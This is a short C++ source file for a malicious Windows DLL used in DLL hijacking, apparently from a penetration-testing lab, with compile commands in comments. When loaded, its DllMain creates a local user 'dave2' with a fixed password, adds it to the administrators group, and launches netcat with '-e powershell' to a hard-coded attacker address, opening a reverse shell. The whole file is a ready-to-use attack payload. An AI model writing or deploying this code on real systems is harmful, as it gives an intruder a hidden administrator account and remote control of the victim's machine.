#include <stdlib.h>
#include <windows.h>
#include <iostream>
#include <cstdio>  
//dll hijack
//compile with either of these commands
//x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
//i686-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch ( ul_reason_for_call )
    {
    case DLL_PROCESS_ATTACH:
    {
        //Change path for nc, ip, and port as needed
        const char* ncPath = "C:\\Users\\User\\nc.exe";
        const char* ip = "10.10.14.189";
        const char* port = "4444";

        char command[256];

        // e.g. "C:\Users\michelle\nc.exe 192.168.45.226 4444 -e powershell"
        sprintf(command, "%s %s %s -e powershell", ncPath, ip, port);

        system("net user dave2 password123! /add");
        system("net localgroup administrators dave2 /add");
        system(command);

        break;
    }
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
